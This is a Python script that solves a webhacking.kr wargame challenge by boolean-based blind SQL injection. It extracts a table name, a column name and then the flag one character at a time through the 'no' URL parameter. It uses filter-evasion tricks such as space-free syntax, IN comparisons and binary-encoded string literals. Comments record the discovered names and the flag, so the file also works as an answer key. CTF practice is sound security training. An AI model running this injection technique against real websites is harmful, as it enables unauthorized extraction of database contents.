import urllib.request

URL = 'https://webhacking.kr/challenge/web-10/?no='
TRUE_PHRASE = '<td>1</td>'


def query(payload):
    req = urllib.request.Request(URL + payload)
    r = urllib.request.urlopen(req)
    content = r.read().decode('utf-8')
    return TRUE_PHRASE in content


# 13
def find_table_name_length():
    table_name_len = 1
    while query('LENGTH((SELECT(MIN(IF((SELECT(TABLE_SCHEMA)IN(DATABASE())),TABLE_NAME,NULL)))FROM(INFORMATION_SCHEMA.TABLES)))IN({})'.format(table_name_len)) is False:
        table_name_len += 1
    print('table_name_len: {}'.format(table_name_len))
    return table_name_len


# flag_ab733768
def find_table_name():
    table_name_len = find_table_name_length()
    table_name = ''
    for pos in range(1, table_name_len + 1):
        for character in range(0, 128):
            if query('ORD(SUBSTR((SELECT(MIN(IF((SELECT(TABLE_SCHEMA)IN(DATABASE())),TABLE_NAME,NULL)))FROM(INFORMATION_SCHEMA.TABLES)),{},1))IN({})'.format(pos, character)) is True:
                table_name += chr(character)
                print(table_name)
                break
    print('table_name: {}'.format(table_name))
    return table_name


# 13
def find_column_name_length(table_name):
    table_name = ''.join(f'{ord(i):08b}' for i in table_name)
    column_name_len = 1
    while query('LENGTH((SELECT(MIN(IF((SELECT(TABLE_NAME)IN(0b{})),COLUMN_NAME,NULL)))FROM(INFORMATION_SCHEMA.COLUMNS)))IN({})'.format(table_name, column_name_len)) is False:
        column_name_len += 1
    print('column_name_len: {}'.format(column_name_len))
    return column_name_len


# flag_3a55b31d
def find_column_name(table_name):
    column_name_len = find_column_name_length(table_name)
    table_name = ''.join(f'{ord(i):08b}' for i in table_name)
    column_name = ''
    for pos in range(1, column_name_len + 1):
        for character in range(0, 128):
            if query('ORD(SUBSTR((SELECT(MIN(IF((SELECT(TABLE_NAME)IN(0b{})),COLUMN_NAME,NULL)))FROM(INFORMATION_SCHEMA.COLUMNS)),{},1))IN({})'.format(table_name, pos, character)) is True:
                column_name += chr(character)
                print(column_name)
                break
    print('column_name: {}'.format(column_name))
    return column_name


# 27
def find_flag_length(column_name, table_name):
    flag_len = 1
    while query('LENGTH((SELECT(MAX({}))FROM({})))IN({})'.format(column_name, table_name, flag_len)) is False:
        flag_len += 1
    print('flag_len: {}'.format(flag_len))
    return flag_len


# FLAG{challenge13gummyclear}
def find_flag():
    table_name = "flag_ab733768"
    column_name = "flag_3a55b31d"
    flag_len = find_flag_length(column_name, table_name)
    flag = ''
    for pos in range(1, flag_len + 1):
        for character in range(0, 128):
            if query('ORD(SUBSTR((SELECT(MAX({}))FROM({})),{},1))IN({})'.format(column_name, table_name, pos, character)) is True:
                flag += chr(character)
                print(flag)
                break
    print('flag: {}'.format(flag))


find_flag()